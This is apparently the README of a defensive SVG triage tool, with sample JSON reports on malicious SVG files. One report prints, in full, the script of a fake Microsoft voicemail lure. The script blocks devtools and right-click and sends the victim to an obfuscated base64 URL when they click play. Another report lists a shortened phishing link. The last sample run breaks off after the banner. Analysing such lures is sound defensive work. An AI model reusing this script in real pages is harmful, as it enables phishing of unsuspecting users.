# violet_svg
https://www.youtube.com/watch?v=jFKWVt8-9J0

# Install
pip3 install git+https://github.com/wmetcalf/violet_svg.git

# Usage

```
coz@genesis:~/violet_svg$ violet_svg -i /home/coz/Downloads/bad4.svg -d datadump/ -o dump.json

   ,-,--.         ,-.-.     _,---.
 ,-.'-  _\ ,--.-./=/ ,/ _.='.'-,  `
/==/_ ,_.'/==/, ||=| -|/==.'-     /
\==\  \   \==\,  \ / ,/==/ -   .-'
 \==\ -\   \==\ - ' - /==|_   /_,-.
 _\==\ ,\   \==\ ,   ||==|  , \_.' )
/==/\/ _ |  |==| -  ,/\==\-  ,    (
\==\ - , /  \==\  _ /  /==/ _  ,  /
 `--`---'    `--`--'   `--`------'
            .=-.-.       ,-.-.    ,----.
   _.-.    /==/_ /,--.-./=/ ,/ ,-.--` , `
 .-,.'|   |==|, |/==/, ||=| -||==|-  _.-`
|==|, |   |==|  |\==\,  \ / ,||==|   `.-.
|==|- |   |==|- | \==\ - ' - /==/_ ,    /
|==|, |   |==| ,|  \==\ ,   ||==|    .-'
|==|- `-._|==|- |  |==| -  ,/|==|_  ,`-._
/==/ - , ,/==/. /  \==\  _ / /==/ ,     /
`--`-----'`--`-`    `--`--'  `--`-----``
 ,--.--------.  ,--.-,,-,--,               _,.---._                     _,---.  ,--.-,,-,--,
/==/,  -   , -\/==/  /|=|  | .-.,.---.   ,-.' , -  `.  .--.-. .-.-. _.='.'-,  \/==/  /|=|  |
\==\.-.  - ,-./|==|_ ||=|, |/==/  `   \ /==/_,  ,  - \/==/ -|/=/  |/==.'-     /|==|_ ||=|, |
 `--`\==\- \   |==| ,|/=| _|==|-, .=., |==|   .=.     |==| ,||=| -/==/ -   .-' |==| ,|/=| _|
      \==\_ \  |==|- `-' _ |==|   '='  /==|_ : ;=:  - |==|- | =/  |==|_   /_,-.|==|- `-' _ |
      |==|- |  |==|  _     |==|- ,   .'|==| , '='     |==|,  \/ - |==|  , \_.' )==|  _     |
      |==|, |  |==|   .-. ,\==|_  . ,'. \==\ -    ,_ /|==|-   ,   |==\-  ,    (|==|   .-. ,`
      /==/ -/  /==/, //=/  /==/  /\ ,  ) '.='. -   .' /==/ , _  .' /==/ _  ,  //==/, //=/  |
      `--`--`  `--`-' `-`--`--`-`--`--'    `--`--''   `--`..---'   `--`------' `--`-' `-`--`
 ,--.--------.  ,--.-,,-,--, .=-.-.  ,-,--.
/==/,  -   , -\/==/  /|=|  |/==/_ /,-.'-  _
\==\.-.  - ,-./|==|_ ||=|, |==|, |/==/_ ,_.'
 `--`\==\- \   |==| ,|/=| _|==|  |\==\  `
      \==\_ \  |==|- `-' _ |==|- | \==\ -`
      |==|- |  |==|  _     |==| ,| _\==\ ,`
      |==|, |  |==|   .-. ,\==|- |/==/\/ _ |
      /==/ -/  /==/, //=/  /==/. /\==\ - , /
      `--`--`  `--`-' `-`--`--`-`  `--`---' 

      https://www.youtube.com/watch?v=jFKWVt8-9J0
      
coz@genesis:~/violet_svg$ cat datadump/dump.json | jq
{
  "has_script": true,
  "svg_metadata": {
    "width": "100%",
    "height": "100%",
    "viewBox": "0 0 900 450",
    "preserveAspectRatio": "xMidYMid meet",
    "version": null,
    "baseProfile": null
  },
  "element_presence": {
    "structural": [
      "g",
      "svg"
    ],
    "shapes": [
      "circle",
      "polygon",
      "rect"
    ],
    "descriptive": [],
    "text": [
      "text"
    ],
    "gradient_and_paint": [],
    "filter_and_masking": [],
    "animation": [],
    "other": [
      "script"
    ],
    "unknown": []
  },
  "element_counts": {
    "structural": {
      "svg": 1,
      "g": 6
    },
    "shapes": {
      "rect": 23,
      "circle": 1,
      "polygon": 1
    },
    "descriptive": {},
    "text": {
      "text": 5
    },
    "gradient_and_paint": {},
    "filter_and_masking": {},
    "animation": {},
    "other": {
      "script": 1
    },
    "unknown": {}
  },
  "attribute_presence": {
    "core_global": [
      "id",
      "xmlns"
    ],
    "events": [],
    "presentation": [
      "style"
    ],
    "coordinate_geometry": [
      "cx",
      "cy",
      "height",
      "points",
      "r",
      "width",
      "x",
      "y"
    ],
    "transform_coordinate": [
      "preserveaspectratio",
      "transform",
      "viewbox"
    ],
    "text_specific": [
      "font-family",
      "font-size",
      "font-weight",
      "text-anchor"
    ],
    "linking": [],
    "animation": [
      "fill"
    ],
    "filter_masking": [],
    "gradient_pattern": [],
    "conditional_processing": [],
    "unknown": [
      "type"
    ]
  },
  "attribute_counts": {
    "core_global": {
      "xmlns": 1,
      "id": 5
    },
    "events": {},
    "presentation": {
      "style": 2
    },
    "coordinate_geometry": {
      "width": 24,
      "height": 24,
      "x": 26,
      "y": 26,
      "cx": 1,
      "cy": 1,
      "r": 1,
      "points": 1
    },
    "transform_coordinate": {
      "viewbox": 1,
      "preserveaspectratio": 1,
      "transform": 4
    },
    "text_specific": {
      "text-anchor": 5,
      "font-size": 5,
      "font-family": 5,
      "font-weight": 1
    },
    "linking": {},
    "animation": {
      "fill": 30
    },
    "filter_masking": {},
    "gradient_pattern": {},
    "conditional_processing": {},
    "unknown": {
      "type": 1
    }
  },
  "presence_hashes": {
    "element:structural:presence": "42e2e551be6cc8c801ddd3fdb1d50b363a2e36c9d427190f52fb35092619ad51",
    "element:shapes:presence": "f90abe415efb27d92f6bcd8587d872bc52880ca4da1009a26d2c24c2a7acdabd",
    "element:descriptive:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:text:presence": "982d9e3eb996f559e633f4d194def3761d909f5a3b647d1a851fead67c32c9d1",
    "element:gradient_and_paint:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:filter_and_masking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:animation:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:other:presence": "21a0270b7f66a1e4c25933f13a1e5a1bbb4757578072930c8189131f9c6aaae1",
    "element:unknown:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:core_global:presence": "111e9a5295a5cc7b848a063e625406ded4f7aec40fd1538c49e6f296e237bf5e",
    "attribute:events:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:presentation:presence": "cb86eb2d914d37df6857c3cfe4827b5f770b01a86578120618b0b21572160be8",
    "attribute:coordinate_geometry:presence": "d7b0aaeb839701b922fe3e2f7c84a338e879674ca2e3e905f3d7f8ea942c8b53",
    "attribute:transform_coordinate:presence": "8a3c054b90f22dd9155d17431edcbc790506bc4abb84fdae440f26a4885c3931",
    "attribute:text_specific:presence": "ef5418e5b30d83a4d0a37db3a84a7187cc68dfde607ff8d747b1e40be53e2f70",
    "attribute:linking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:animation:presence": "dcd32479a72e55b29a03a586d8a483a05be0ce87cc5c25c7bad23079fc0356b3",
    "attribute:filter_masking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:gradient_pattern:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:conditional_processing:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:unknown:presence": "1303c06b0b014d0ce7b988ab173a13f31227d417058ff4bbe6f8c222b4ad913c"
  },
  "count_hashes": {
    "element:structural:count": "10071916f25693becc7cff20bed10da513f614c1aede1c0ce7c825a2267c4378",
    "element:shapes:count": "ee276b94b6a896dc6e0e7063a9d458ec3cec0ce07ab79112324115f4f17e04f7",
    "element:descriptive:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:text:count": "3f8b6cf21531151e7aee59a00cfbedc1094de858ef33e80a4b2954f0d33caea6",
    "element:gradient_and_paint:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:filter_and_masking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:animation:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:other:count": "defced8f0fbe436a803b2958313a4231f59f18bb8ec0dfaea2413da51f21ae3b",
    "element:unknown:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:core_global:count": "ad12c5e36a10a8b9f4a1e1c5c1746d58637640187148696209dd566995d0200c",
    "attribute:events:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:presentation:count": "62d697d29e93ec589050857648511057bd158337f99c6ea215f16d659950e5af",
    "attribute:coordinate_geometry:count": "363638f6e71cf118ebbe4832977846602342bd57af1729fe2269645f0b160210",
    "attribute:transform_coordinate:count": "9767ffad08127966e4db8a646f89256df595e2142602e70f70ba7c4b7a5b9e85",
    "attribute:text_specific:count": "727bc9047d59beedfe63774a9733afac9c957c0c3345475e4cd217012dd4c1a3",
    "attribute:linking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:animation:count": "b8d5c3f833435c7cb5fb8fb8faa1b578207bc37e080163a1213e3a592524fdcd",
    "attribute:filter_masking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:gradient_pattern:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:conditional_processing:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:unknown:count": "6e836b19d14fae9b2cb47cb1a2abc5772d9f4516ed1fe0c18db7400afd579746"
  },
  "composite_hash": "1264588d6d5f14c9c7d9f0c65ac9d436f75e7df0d89e628294e8444458e47ec1",
  "is_svg_wide": true,
  "found_invisible_chars": false,
  "normalized_content_length": 8917,
  "original_content_length": 8917,
  "invisible_flags_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "invisible_flags_unique": [],
  "invisible_flags_counts": {},
  "invisible_chars_total": 0,
  "only_script": false,
  "has_fullscreen_foreignobject": false,
  "has_iframe_in_foreignobject": false,
  "has_base64_dataurl_script_src": false,
  "script_features": {
    "http_base64_in_script": true,
    "eval": false,
    "preventdefault": true,
    "fromcharcode": false,
    "charcodeat": false,
    "replace": true,
    "concat": false,
    "long_hex_string": false,
    "long_b64_string": false,
    "two_for_one_match": false,
    "split": true,
    "atob": false,
    "btoa": false,
    "unescape": false,
    "escape": false,
    "decodeuri": false,
    "encodeuri": false,
    "decodeuricomponent": false,
    "encodeuricomponent": false,
    "document_write": false,
    "document_writeln": false,
    "document_open": false,
    "document_createelement": false,
    "window_location": true,
    "contextmenu": true,
    "ctrlkey": true,
    "shiftkey": true,
    "altkey": false,
    "metakey": true,
    "keycode": true,
    "magic85": true,
    "magic123": true,
    "magic73": true,
    "magic74": true,
    "join": true,
    "map": false,
    "filter": false,
    "reduce": false,
    "slice": false,
    "domcontentloaded": false,
    "createelementns": false,
    "blob": false,
    "click": true,
    "appendchild": false,
    "createobjecturl": false,
    "revokeobjecturl": false,
    "insertbefore": false,
    "removechild": false,
    "addeventlistener": true,
    "clipboardwritetext": false
  },
  "security_composite_hash": "74f8bb8ac28fe330a7e1de1b0340f567905a24673b5badee76334e07d9e3c812",
  "security_composite_hash_dimensions": "0ff45a39ece25a0888bbb31d7116be8ad2604cc260587f153aada9501d377698",
  "security_composite_hash_script_features_v1": "249813f8f4d2b46a5c3ef094f9c170ad3fba92bf382200064aceb7a589419d16",
  "extracted_data": {
    "urls": [],
    "scripts": [
      "\r\n                    (function(){\r\n                    // --- Disable context menu and developer tools shortcuts ---\r\n                    document.addEventListener(\"contextmenu\", function(e) {\r\n                        e.preventDefault();\r\n                    });\r\n                    \r\n                    document.onkeydown = function(e) {\r\n                        // Block F12, Ctrl+Shift+I/J, Ctrl+U and Cmd+U\r\n                        if (e.keyCode === 123 || \r\n                            ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||\r\n                            ((e.ctrlKey || e.metaKey) && e.keyCode === 85)) {\r\n                        e.preventDefault();\r\n                        return false;\r\n                        }\r\n                    };\r\n\r\n                    // Additional listeners to block Ctrl+U and Cmd+U reliably\r\n                    function disableInspect(e) {\r\n                        var code = e.keyCode || e.which;\r\n                        if ((e.ctrlKey || e.metaKey) && code === 85) {\r\n                        e.preventDefault();\r\n                        e.stopPropagation();\r\n                        return false;\r\n                        }\r\n                    }\r\n                    document.addEventListener('keydown', disableInspect, false);\r\n                    document.addEventListener('keyup', disableInspect, false);\r\n                    document.addEventListener('keypress', disableInspect, false);\r\n\r\n                    // Optional: Detect if devtools are open and redirect if so.\r\n                    var threshold = 160;\r\n                    function checkDevTools() {\r\n                        if ((window.outerWidth - window.innerWidth > threshold) ||\r\n                            (window.outerHeight - window.innerHeight > threshold)) {\r\n                        window.location.replace(\"about:blank\");\r\n                        }\r\n                    }\r\n                    setInterval(checkDevTools, 1000);\r\n                    // --- End disabling shortcuts ---\r\n\r\n                    // Randomize sender name using common first and last names\r\n                    var firstNames = [\"Alice\", \"Bob\", \"Charlie\", \"David\", \"Emma\", \"Fiona\", \"George\", \"Hannah\", \"Ian\", \"Julia\", \"Kevin\", \"Laura\", \"Michael\", \"Nina\", \"Oliver\", \"Patricia\", \"Quinn\", \"Rachel\", \"Samuel\", \"Tina\"];\r\n                    var lastNames = [\"Smith\", \"Johnson\", \"Williams\", \"Brown\", \"Jones\", \"Garcia\", \"Miller\", \"Davis\", \"Rodriguez\", \"Martinez\", \"Hernandez\", \"Lopez\", \"Gonzalez\", \"Wilson\", \"Anderson\", \"Thomas\", \"Taylor\", \"Moore\", \"Jackson\", \"Martin\"];\r\n                    var randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];\r\n                    var randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];\r\n                    var randomFullName = randomFirstName + \" \" + randomLastName;\r\n                    var nameText = document.getElementById(\"nameText\");\r\n                    if(nameText) {\r\n                        nameText.textContent = \"From: \" + randomFullName;\r\n                    }\r\n                    \r\n                    // Randomize voicemail duration seconds (random number between 10 and 59)\r\n                    var randomSeconds = Math.floor(Math.random() * 50) + 10;\r\n                    var timeText = document.getElementById(\"timeText\");\r\n                    if(timeText) {\r\n                        timeText.textContent = \"0:00 / 0:\" + randomSeconds;\r\n                    }\r\n                    \r\n                    // --- Play/Pause and URL redirection ---\r\n                    var playButton = document.getElementById(\"playButton\");\r\n                    var playIcon = document.getElementById(\"playIcon\");\r\n                    var pauseIcon = document.getElementById(\"pauseIcon\");\r\n                    \r\n                    playButton.addEventListener(\"click\", function(){\r\n                        // Swap icons: hide play, show pause\r\n                        playIcon.style.display = \"none\";\r\n                        pauseIcon.style.display = \"block\";\r\n                        \r\n                        // Obfuscated URL redirection code\r\n                        const LDQEfVIq = 'dVDUCQ8VU';\r\n                        const EJOMERSi = [\"aHR0cHM6Ly9vbmVzdG9\",\"wZm9yYWxsLnh5ei9hdT\",\"NnZmdmZ2dmL0NFUEhBU\",\"y9NM3NOMHRMOGtZL2lt\",\"Zy9vbmRyaXZlLw==\"];\r\n                        const zSQuxiem = EJOMERSi.join(LDQEfVIq);\r\n                        const IotdAtfN = window[\"at\"+\"ob\"];\r\n                        const jfpUuThX = window[\"lo\"+\"cat\"+\"ion\"];\r\n                        const KiIQEgnj = \"re\"+\"pl\"+\"ace\";\r\n                        \r\n                        function uLmCozCf(){\r\n                        return IotdAtfN(zSQuxiem.split(LDQEfVIq).join(''));\r\n                        }\r\n                        \r\n                        const tUbMPJhB = uLmCozCf() + '';\r\n                        jfpUuThX[KiIQEgnj](tUbMPJhB);\r\n                    });\r\n                    })();\r\n                "
    ],
    "text": [
      "Voice Message Received",
      "You have a new voice message!",
      "From: Placeholder",
      "0:00 / 0:00",
      "© 2025 Microsoft Corporation. All rights reserved."
    ]
  },
  "data_urls": []
}

coz@genesis:~/violet_svg$ violet_svg -i /home/coz/Downloads/bad10.svg -d datadump/ -o dump.json

   ,-,--.         ,-.-.     _,---.
 ,-.'-  _\ ,--.-./=/ ,/ _.='.'-,  `
/==/_ ,_.'/==/, ||=| -|/==.'-     /
\==\  \   \==\,  \ / ,/==/ -   .-'
 \==\ -\   \==\ - ' - /==|_   /_,-.
 _\==\ ,\   \==\ ,   ||==|  , \_.' )
/==/\/ _ |  |==| -  ,/\==\-  ,    (
\==\ - , /  \==\  _ /  /==/ _  ,  /
 `--`---'    `--`--'   `--`------'
            .=-.-.       ,-.-.    ,----.
   _.-.    /==/_ /,--.-./=/ ,/ ,-.--` , `
 .-,.'|   |==|, |/==/, ||=| -||==|-  _.-`
|==|, |   |==|  |\==\,  \ / ,||==|   `.-.
|==|- |   |==|- | \==\ - ' - /==/_ ,    /
|==|, |   |==| ,|  \==\ ,   ||==|    .-'
|==|- `-._|==|- |  |==| -  ,/|==|_  ,`-._
/==/ - , ,/==/. /  \==\  _ / /==/ ,     /
`--`-----'`--`-`    `--`--'  `--`-----``
 ,--.--------.  ,--.-,,-,--,               _,.---._                     _,---.  ,--.-,,-,--,
/==/,  -   , -\/==/  /|=|  | .-.,.---.   ,-.' , -  `.  .--.-. .-.-. _.='.'-,  \/==/  /|=|  |
\==\.-.  - ,-./|==|_ ||=|, |/==/  `   \ /==/_,  ,  - \/==/ -|/=/  |/==.'-     /|==|_ ||=|, |
 `--`\==\- \   |==| ,|/=| _|==|-, .=., |==|   .=.     |==| ,||=| -/==/ -   .-' |==| ,|/=| _|
      \==\_ \  |==|- `-' _ |==|   '='  /==|_ : ;=:  - |==|- | =/  |==|_   /_,-.|==|- `-' _ |
      |==|- |  |==|  _     |==|- ,   .'|==| , '='     |==|,  \/ - |==|  , \_.' )==|  _     |
      |==|, |  |==|   .-. ,\==|_  . ,'. \==\ -    ,_ /|==|-   ,   |==\-  ,    (|==|   .-. ,`
      /==/ -/  /==/, //=/  /==/  /\ ,  ) '.='. -   .' /==/ , _  .' /==/ _  ,  //==/, //=/  |
      `--`--`  `--`-' `-`--`--`-`--`--'    `--`--''   `--`..---'   `--`------' `--`-' `-`--`
 ,--.--------.  ,--.-,,-,--, .=-.-.  ,-,--.
/==/,  -   , -\/==/  /|=|  |/==/_ /,-.'-  _
\==\.-.  - ,-./|==|_ ||=|, |==|, |/==/_ ,_.'
 `--`\==\- \   |==| ,|/=| _|==|  |\==\  `
      \==\_ \  |==|- `-' _ |==|- | \==\ -`
      |==|- |  |==|  _     |==| ,| _\==\ ,`
      |==|, |  |==|   .-. ,\==|- |/==/\/ _ |
      /==/ -/  /==/, //=/  /==/. /\==\ - , /
      `--`--`  `--`-' `-`--`--`-`  `--`---' 

      https://www.youtube.com/watch?v=jFKWVt8-9J0
      
coz@genesis:~/violet_svg$ cat datadump/dump.json | jq
{
  "has_script": false,
  "svg_metadata": {
    "width": null,
    "height": null,
    "viewBox": "0 0 800 600",
    "preserveAspectRatio": "xMidYMid meet",
    "version": "1.1",
    "baseProfile": null
  },
  "element_presence": {
    "structural": [
      "a",
      "image",
      "svg"
    ],
    "shapes": [
      "rect"
    ],
    "descriptive": [
      "metadata"
    ],
    "text": [],
    "gradient_and_paint": [],
    "filter_and_masking": [],
    "animation": [],
    "other": [],
    "unknown": [
      "id",
      "timestamp"
    ]
  },
  "element_counts": {
    "structural": {
      "svg": 1,
      "image": 1,
      "a": 1
    },
    "shapes": {
      "rect": 1
    },
    "descriptive": {
      "metadata": 1
    },
    "text": {},
    "gradient_and_paint": {},
    "filter_and_masking": {},
    "animation": {},
    "other": {},
    "unknown": {
      "id": 1,
      "timestamp": 1
    }
  },
  "attribute_presence": {
    "core_global": [
      "xmlns"
    ],
    "events": [],
    "presentation": [],
    "coordinate_geometry": [
      "height",
      "width",
      "x",
      "y"
    ],
    "transform_coordinate": [
      "preserveaspectratio",
      "viewbox"
    ],
    "text_specific": [],
    "linking": [
      "href"
    ],
    "animation": [
      "fill"
    ],
    "filter_masking": [],
    "gradient_pattern": [],
    "conditional_processing": [],
    "unknown": [
      "version"
    ]
  },
  "attribute_counts": {
    "core_global": {
      "xmlns": 1
    },
    "events": {},
    "presentation": {},
    "coordinate_geometry": {
      "width": 2,
      "height": 2,
      "x": 1,
      "y": 1
    },
    "transform_coordinate": {
      "viewbox": 1,
      "preserveaspectratio": 1
    },
    "text_specific": {},
    "linking": {
      "href": 2
    },
    "animation": {
      "fill": 1
    },
    "filter_masking": {},
    "gradient_pattern": {},
    "conditional_processing": {},
    "unknown": {
      "version": 1
    }
  },
  "presence_hashes": {
    "element:structural:presence": "0924f1059456b2a5c2a0c1e2a0d954b9465c442cdd33f178eeaa6eb3e4d933e5",
    "element:shapes:presence": "0a473ebefc5a26e430173109878f75c43934eaeedc461568c8a198baa8a1b419",
    "element:descriptive:presence": "45447b7afbd5e544f7d0f1df0fccd26014d9850130abd3f020b89ff96b82079f",
    "element:text:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:gradient_and_paint:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:filter_and_masking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:animation:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:other:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:unknown:presence": "ebeee149401a177b8dcaaeea742597c05b49b4fb93b5dcbb9344b5cc83528b92",
    "attribute:core_global:presence": "f4b32bbe56ec2e3233a0dcab6b3355534a5974539dd2226c98572434e0b3e5e7",
    "attribute:events:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:presentation:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:coordinate_geometry:presence": "bb78403c835af43b22230b1ef32903c99ded8c8658db668a695dc5f910b14d56",
    "attribute:transform_coordinate:presence": "dafb1862c122e0a89dc26c01a08532b34565d131f5fb73c19e82da1f57a15786",
    "attribute:text_specific:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:linking:presence": "fea45fa70a7a8b4e5abc1b12b6de8a8a022b0bdaca0eff8f3d2f8d07cefcb500",
    "attribute:animation:presence": "dcd32479a72e55b29a03a586d8a483a05be0ce87cc5c25c7bad23079fc0356b3",
    "attribute:filter_masking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:gradient_pattern:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:conditional_processing:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:unknown:presence": "5ca4f3850ccc331aaf8a257d6086e526a3b42a63e18cb11d020847985b31d188"
  },
  "count_hashes": {
    "element:structural:count": "eaba8e0da8bba6dd21c52449cfec29b1ade633a727a668625b5f917cc0da4d13",
    "element:shapes:count": "1e5e1718a7121c7cdc718eaa090830fdfddbe1f6f4967ffc3965e5cdbcc6490c",
    "element:descriptive:count": "6b70101ce5ab71e350b0e885c92e87ec2a4f4d5e17cb4620aa9d201fb2fa3891",
    "element:text:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:gradient_and_paint:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:filter_and_masking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:animation:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:other:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:unknown:count": "fd30068546ae417bcf92c1d01576ddee3ee6f00139cfcf918ea1ddcc385174c5",
    "attribute:core_global:count": "b015799b9b9ce3dc7fbe3d5c351c2281fdb099677f65552e896855785ddde6ff",
    "attribute:events:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:presentation:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:coordinate_geometry:count": "0a98ca2956b857bbfd3233fc55c1424b4710e0e45150bc6c0333895f753aa254",
    "attribute:transform_coordinate:count": "d6fa30147f87bf16dd2f0247249dc75ee49145ee4fc59043301c2e4b069bc72c",
    "attribute:text_specific:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:linking:count": "5fad5387141135f7754e0823f1d7c922a4fe9b1d6269c6c1f5e1e050b4ae136e",
    "attribute:animation:count": "c849ab26e0c9d3c3907d5d0ff5293b8c59b4fb402eb95716eacca4b02e9b73ed",
    "attribute:filter_masking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:gradient_pattern:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:conditional_processing:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:unknown:count": "fb60fd65f24ff2c73b9f9c794f021ae42cb0265c47b943e01ce2806aade6b624"
  },
  "composite_hash": "93a38f0a1b46bf5dc58c706854b9097d3b7e6d9c3308b59ac4234f13b1252e2d",
  "is_svg_wide": true,
  "found_invisible_chars": true,
  "normalized_content_length": 1137463,
  "original_content_length": 1137464,
  "invisible_flags_hash": "0aa5833231f75736bd480366d7b83d23a665478fad28b8346fb5e863423a70e1",
  "invisible_flags_unique": [
    "svg_unicode_invisible_FEFF"
  ],
  "invisible_flags_counts": {
    "svg_unicode_invisible_FEFF": 1
  },
  "invisible_chars_total": 1,
  "only_script": false,
  "has_fullscreen_foreignobject": false,
  "has_iframe_in_foreignobject": false,
  "has_base64_dataurl_script_src": false,
  "script_features": {},
  "security_composite_hash": "fbd62d08d1d1709e489751065db30d467e9b5dc16f0b1fb5393469e3a88e784a",
  "security_composite_hash_dimensions": "93c19022999657ac112b7e47473183480707f03d85a78ed9d3f91f886aa48b76",
  "security_composite_hash_script_features_v1": "2dcf2fcdfe6cd651e12cbf110f2509eb24cd40e19275c031719f3fce310434af",
  "extracted_data": {
    "urls": [
      "https://tinyurl.com/24g38j67?id=ebd67d65-3b0d-4170-bbeb-32a8cb58326d"
    ],
    "scripts": [],
    "text": []
  },
  "data_urls": [
    {
      "claimed_mime": "image/png",
      "actual_mime": "image/jpeg",
      "is_base64": true,
      "file_path": "datadump/acb1edb6465474849e1d29dfc5368f3acbce1b28443b4859ab9f03f6d38a05b8.bin",
      "sha1": "50ccd7ec3d73298af82bdb6e621f98143cd2effc",
      "sha256": "acb1edb6465474849e1d29dfc5368f3acbce1b28443b4859ab9f03f6d38a05b8",
      "size": 66320,
      "image_hashes": {
        "ahash": "e7c30081e7ffffff",
        "dhash": "1c1e0d0f0c2a0000",
        "phash": "b33399d1b30b0b8b"
      }
    }
  ]
}

oz@genesis:~/violet_svg$ violet_svg -i /home/coz/Downloads/bad9.svg -d datadump/ -o dump.json

   ,-,--.         ,-.-.     _,---.
 ,-.'-  _\ ,--.-./=/ ,/ _.='.'-,  `
/==/_ ,_.'/==/, ||=| -|/==.'-     /
\==\  \   \==\,  \ / ,/==/ -   .-'
 \==\ -\   \==\ - ' - /==|_   /_,-.
 _\==\ ,\   \==\ ,   ||==|  , \_.' )
/==/\/ _ |  |==| -  ,/\==\-  ,    (
\==\ - , /  \==\  _ /  /==/ _  ,  /
 `--`---'    `--`--'   `--`------'
            .=-.-.       ,-.-.    ,----.
   _.-.    /==/_ /,--.-./=/ ,/ ,-.--` , `
 .-,.'|   |==|, |/==/, ||=| -||==|-  _.-`
|==|, |   |==|  |\==\,  \ / ,||==|   `.-.
|==|- |   |==|- | \==\ - ' - /==/_ ,    /
|==|, |   |==| ,|  \==\ ,   ||==|    .-'
|==|- `-._|==|- |  |==| -  ,/|==|_  ,`-._
/==/ - , ,/==/. /  \==\  _ / /==/ ,     /
`--`-----'`--`-`    `--`--'  `--`-----``
 ,--.--------.  ,--.-,,-,--,               _,.---._                     _,---.  ,--.-,,-,--,
/==/,  -   , -\/==/  /|=|  | .-.,.---.   ,-.' , -  `.  .--.-. .-.-. _.='.'-,  \/==/  /|=|  |
\==\.-.  - ,-./|==|_ ||=|, |/==/  `   \ /==/_,  ,  - \/==/ -|/=/  |/==.'-     /|==|_ ||=|, |
 `--`\==\- \   |==| ,|/=| _|==|-, .=., |==|   .=.     |==| ,||=| -/==/ -   .-' |==| ,|/=| _|
      \==\_ \  |==|- `-' _ |==|   '='  /==|_ : ;=:  - |==|- | =/  |==|_   /_,-.|==|- `-' _ |
      |==|- |  |==|  _     |==|- ,   .'|==| , '='     |==|,  \/ - |==|  , \_.' )==|  _     |
      |==|, |  |==|   .-. ,\==|_  . ,'. \==\ -    ,_ /|==|-   ,   |==\-  ,    (|==|   .-. ,`
      /==/ -/  /==/, //=/  /==/  /\ ,  ) '.='. -   .' /==/ , _  .' /==/ _  ,  //==/, //=/  |
      `--`--`  `--`-' `-`--`--`-`--`--'    `--`--''   `--`..---'   `--`------' `--`-' `-`--`
 ,--.--------.  ,--.-,,-,--, .=-.-.  ,-,--.
/==/,  -   , -\/==/  /|=|  |/==/_ /,-.'-  _
\==\.-.  - ,-./|==|_ ||=|, |==|, |/==/_ ,_.'
